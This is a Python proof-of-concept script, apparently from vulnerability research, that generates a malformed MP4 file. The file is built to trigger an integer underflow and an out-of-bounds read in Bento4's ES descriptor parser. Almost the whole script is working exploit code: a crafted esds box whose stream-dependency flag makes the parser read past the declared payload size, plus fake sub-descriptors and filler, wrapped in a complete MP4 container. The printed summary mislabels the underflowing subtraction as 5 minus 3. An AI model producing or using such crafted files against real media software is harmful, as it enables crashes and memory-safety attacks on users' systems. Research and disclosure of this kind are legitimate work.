#!/usr/bin/env python3
"""
PoC generator for VULN 001 - Integer Underflow in EsDescriptor SubStream Size
CWE-191 -> CWE-125: Out-of-bounds Stream Read

Target: AP4_EsDescriptor::AP4_EsDescriptor in Ap4EsDescriptor.cpp lines 100-110

Vulnerability: At line 103:
    AP4_SubStream* substream = new AP4_SubStream(stream, offset,
                                                 payload_size-AP4_Size(offset-start));

If consumed bytes (offset-start) exceed the declared payload_size, the subtraction wraps
around as unsigned 32-bit arithmetic, producing ~0xFFFFFFFE (~4 GB). The while loop at
lines 105-109 then reads sub-descriptors far beyond the ES descriptor boundary.

Trigger: Craft an ES_Descriptor with expandable-size=3 (3-byte payload) but set
         STREAM_DEPENDENCY flag (bit 5 of flags byte = 0x20), causing the parser to
         additionally read 2 bytes for DependsOn_ES_ID. Total consumed = 5 bytes > 3
         declared, wrapping subtraction to 0xFFFFFFFE.

NOTE: Bento4 implements AP4_ES_DESCRIPTOR_FLAG_STREAM_DEPENDENCY = 1, which maps to
      m_Flags = (bits>>5)&7 checking bit 0 of m_Flags, which corresponds to bit 5 of
      the raw flags byte (0x20). The MPEG-4 standard has streamDependenceFlag at bit 7
      (0x80), but Bento4's flag constants do NOT follow the standard bit ordering.
"""

import struct
import os

OUTPUT_DIR = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4EsDescriptor_cpp"
OUTPUT_FILE = os.path.join(OUTPUT_DIR, "vuln_001.mp4")


def box(box_type: bytes, payload: bytes) -> bytes:
    """Build an MP4 box: 4-byte BE size + 4-byte type + payload."""
    assert len(box_type) == 4, "box_type must be 4 bytes"
    size = 8 + len(payload)
    return struct.pack(">I", size) + box_type + payload


def fullbox(box_type: bytes, version: int, flags: int, payload: bytes) -> bytes:
    """Build a full MP4 box (with version + flags header)."""
    header = struct.pack(">BBH", version, (flags >> 16) & 0xFF,
                         flags & 0xFFFF)  # version(1) + flags(3)
    # Re-pack correctly: version(1 byte) + flags(3 bytes)
    header = bytes([version]) + struct.pack(">I", flags)[1:]
    return box(box_type, header + payload)


def identity_matrix() -> bytes:
    """Return the standard 3x3 identity matrix used in MP4 (9 x 4 bytes)."""
    return struct.pack(">9I",
                       0x00010000, 0, 0,
                       0, 0x00010000, 0,
                       0, 0, 0x40000000)


# -----------------------------------------------------------------------
# ftyp box
# -----------------------------------------------------------------------
ftyp_payload = b"isom" + struct.pack(">I", 0) + b"isom"
ftyp = box(b"ftyp", ftyp_payload)

# -----------------------------------------------------------------------
# Craft the malicious esds box
#
# ES_Descriptor structure in file:
#   tag=0x03 (1B) | size=0x03 (1B, expandable, declares 3-byte payload)
#   | ES_ID=0x0001 (2B) | flags=0x20 (1B, STREAM_DEPENDENCY bit set)
#   | DependsOn_ES_ID=0x0002 (2B)  <-- read because STREAM_DEPENDENCY set
#   [Total consumed: 5 bytes from stream, but payload_size = 3]
#   [underflow: 3 - AP4_Size(5) = 0xFFFFFFFE, SubStream gets ~4 GB size]
#   [Loop then reads sub-descriptors beyond the ES descriptor boundary]
#
# Extra bytes after DependsOn (within esds box body) to give the loop
# something to parse as fake sub-descriptors:
#   tag=0x04 (AP4_DESCRIPTOR_TAG_DECODER_CONFIG=0x04) | size=0x0D (13 bytes)
#   | 13 zero bytes (decoder config fields)
# Then additional padding to extend what the loop can read.
# -----------------------------------------------------------------------

# ES_Descriptor content
es_tag = b"\x03"          # AP4_DESCRIPTOR_TAG_ES = 0x03
es_size = b"\x03"         # expandable size = 3 bytes of payload
es_id = struct.pack(">H", 0x0001)          # ES_ID
es_flags = b"\x20"        # bit5=1 -> AP4_ES_DESCRIPTOR_FLAG_STREAM_DEPENDENCY
                           # m_Flags = (0x20>>5)&7 = 1 -> STREAM_DEPENDENCY set
es_depends_on = struct.pack(">H", 0x0002)  # DependsOn_ES_ID (read due to flag)

# Fake sub-descriptor 1: DecoderConfigDescriptor with exactly 13-byte payload
# (avoiding secondary underflow in DecoderConfigDescriptor at payload_size-13)
dc_tag = b"\x04"          # AP4_DESCRIPTOR_TAG_DECODER_CONFIG
dc_size = b"\x0d"         # payload_size = 13
dc_payload = bytes(13)    # 13 zero bytes (ObjectTypeIndication + StreamType + ...)

fake_dc_descriptor = dc_tag + dc_size + dc_payload  # 15 bytes

# Fake sub-descriptor 2: Unknown descriptor with a modest payload
# This helps the loop find more data to parse if it continues
unknown_tag = b"\x05"     # SLConfigDescriptor-ish but payload != 1 -> unknown default
unknown_size = b"\x10"    # payload_size = 16
unknown_payload = bytes(16)
fake_unknown_descriptor = unknown_tag + unknown_size + unknown_payload  # 18 bytes

# Additional padding bytes that look like descriptors with small sizes
# These extend the readable range inside the esds box
filler = b"\x06\x7f" + bytes(127)  # tag=0x06, size=0x7F=127, 127 zero bytes -> 129 bytes

esds_descriptor_payload = (
    es_tag + es_size +          # ES_Descriptor header (tag + expandable size)
    es_id +                     # 2 bytes - within declared 3-byte payload
    es_flags +                  # 1 byte  - within declared 3-byte payload (all 3 used)
    es_depends_on +             # 2 bytes - OUTSIDE the declared payload (triggers underflow)
    # [SubStream starts here with size=0xFFFFFFFE]
    fake_dc_descriptor +        # 15 bytes of data for the loop to parse
    fake_unknown_descriptor +   # 18 bytes
    filler                      # 129 bytes
)

# esds box: 4-byte version+flags + descriptor payload
esds_version_flags = struct.pack(">I", 0x00000000)
esds_body = esds_version_flags + esds_descriptor_payload
esds = box(b"esds", esds_body)

# -----------------------------------------------------------------------
# mp4a audio sample entry
# -----------------------------------------------------------------------
mp4a_reserved = bytes(6)                          # 6 reserved bytes
mp4a_data_ref_index = struct.pack(">H", 1)        # data_reference_index
mp4a_reserved2 = bytes(8)                         # 8 reserved bytes
mp4a_channel_count = struct.pack(">H", 2)         # 2 channels
mp4a_sample_size = struct.pack(">H", 16)          # 16-bit
mp4a_pre_defined = struct.pack(">H", 0)
mp4a_reserved3 = struct.pack(">H", 0)
mp4a_sample_rate = struct.pack(">I", 0x44AC0000)  # 44100 Hz (fixed-point 16.16)

mp4a_body = (mp4a_reserved + mp4a_data_ref_index + mp4a_reserved2 +
             mp4a_channel_count + mp4a_sample_size +
             mp4a_pre_defined + mp4a_reserved3 +
             mp4a_sample_rate + esds)
mp4a = box(b"mp4a", mp4a_body)

# -----------------------------------------------------------------------
# stsd box
# -----------------------------------------------------------------------
stsd_header = struct.pack(">II", 0x00000000, 1)  # version+flags=0, entry_count=1
stsd = box(b"stsd", stsd_header + mp4a)

# -----------------------------------------------------------------------
# stts box (time-to-sample): 1 entry: 1 sample, duration=1
# -----------------------------------------------------------------------
stts_body = struct.pack(">II", 0, 1) + struct.pack(">II", 1, 1)
stts = box(b"stts", stts_body)

# -----------------------------------------------------------------------
# stsc box (sample-to-chunk): 1 entry
# -----------------------------------------------------------------------
stsc_body = struct.pack(">II", 0, 1) + struct.pack(">III", 1, 1, 1)
stsc = box(b"stsc", stsc_body)

# -----------------------------------------------------------------------
# stsz box (sample sizes): sample_size=0 (variable), sample_count=1
# one entry of size 0
# -----------------------------------------------------------------------
stsz_body = struct.pack(">III", 0, 0, 1) + struct.pack(">I", 0)
stsz = box(b"stsz", stsz_body)

# -----------------------------------------------------------------------
# stco box (chunk offsets): 1 chunk at offset 0x28
# -----------------------------------------------------------------------
stco_body = struct.pack(">III", 0, 1, 0x28)
stco = box(b"stco", stco_body)

# -----------------------------------------------------------------------
# stbl box
# -----------------------------------------------------------------------
stbl = box(b"stbl", stsd + stts + stsc + stsz + stco)

# -----------------------------------------------------------------------
# smhd box (sound media header)
# -----------------------------------------------------------------------
smhd_body = struct.pack(">IHH", 0, 0, 0)  # version+flags, balance, reserved
smhd = box(b"smhd", smhd_body)

# -----------------------------------------------------------------------
# dinf + dref (data information: self-contained URL reference)
# -----------------------------------------------------------------------
url_entry = box(b"url ", struct.pack(">I", 0x00000001))  # version+flags=1 (self-contained)
dref_body = struct.pack(">II", 0, 1) + url_entry         # version+flags=0, entry_count=1
dref = box(b"dref", dref_body)
dinf = box(b"dinf", dref)

# -----------------------------------------------------------------------
# minf box (media information)
# -----------------------------------------------------------------------
minf = box(b"minf", smhd + dinf + stbl)

# -----------------------------------------------------------------------
# mdhd box (media header, version 0)
# -----------------------------------------------------------------------
mdhd_body = struct.pack(">IIIIIHH",
                         0,         # version=0, flags=0
                         0,         # creation_time
                         0,         # modification_time
                         44100,     # timescale
                         0,         # duration
                         0x55C4,    # language = "und" packed + quality
                         0)         # pre_defined
mdhd = box(b"mdhd", mdhd_body)

# -----------------------------------------------------------------------
# hdlr box (handler reference: sound)
# -----------------------------------------------------------------------
hdlr_body = (struct.pack(">II", 0, 0) +   # version+flags, pre_defined
             b"soun" +                     # handler_type
             bytes(12) +                   # reserved
             b"SoundHandler\x00")          # name (null-terminated)
hdlr = box(b"hdlr", hdlr_body)

# -----------------------------------------------------------------------
# mdia box (media)
# -----------------------------------------------------------------------
mdia = box(b"mdia", mdhd + hdlr + minf)

# -----------------------------------------------------------------------
# tkhd box (track header, version 0)
# -----------------------------------------------------------------------
tkhd_body = (struct.pack(">I", 0x00000003) +   # version=0, flags=3 (enabled+in-movie)
             struct.pack(">IIIII", 0, 0, 1, 0, 0) +  # ctime, mtime, track_id, reserved, duration
             bytes(8) +                         # reserved
             struct.pack(">HHHH", 0, 0, 0x0100, 0) +  # layer, alt_group, volume, reserved
             identity_matrix() +
             struct.pack(">II", 0, 0))          # width, height
tkhd = box(b"tkhd", tkhd_body)

# -----------------------------------------------------------------------
# trak box (track)
# -----------------------------------------------------------------------
trak = box(b"trak", tkhd + mdia)

# -----------------------------------------------------------------------
# mvhd box (movie header, version 0)
# -----------------------------------------------------------------------
mvhd_body = (struct.pack(">I", 0x00000000) +   # version+flags
             struct.pack(">IIIII", 0, 0, 1000, 0, 0x00010000) +  # ctime, mtime, timescale, dur, rate
             struct.pack(">H", 0x0100) +        # volume
             bytes(10) +                        # reserved
             identity_matrix() +
             bytes(24) +                        # pre_defined
             struct.pack(">I", 2))              # next_track_ID
mvhd = box(b"mvhd", mvhd_body)

# -----------------------------------------------------------------------
# moov box (movie container)
# -----------------------------------------------------------------------
moov = box(b"moov", mvhd + trak)

# -----------------------------------------------------------------------
# mdat box (media data - minimal placeholder)
# -----------------------------------------------------------------------
mdat = box(b"mdat", bytes(8))

# -----------------------------------------------------------------------
# Assemble the complete file
# -----------------------------------------------------------------------
mp4_file = ftyp + moov + mdat

os.makedirs(OUTPUT_DIR, exist_ok=True)
with open(OUTPUT_FILE, "wb") as f:
    f.write(mp4_file)

print(f"[+] Written malicious MP4 to: {OUTPUT_FILE}")
print(f"[+] File size: {len(mp4_file)} bytes")
print()
print("[+] Vulnerability trigger summary:")
print("    ES_Descriptor declared payload_size = 3")
print("    Bytes actually consumed from stream = 5 (ES_ID[2] + flags[1] + DependsOn[2])")
print("    AP4_Size(5 - 3) underflows to 0xFFFFFFFE (~4 GB)")
print("    SubStream is created with size ~4 GB, loop reads far beyond esds boundary")
print()
print("[+] Flags byte used = 0x20:")
print("    m_Flags = (0x20 >> 5) & 7 = 1")
print("    AP4_ES_DESCRIPTOR_FLAG_STREAM_DEPENDENCY = 1")
print("    m_Flags & 1 = 1 -> STREAM_DEPENDENCY triggered -> reads 2-byte DependsOn")
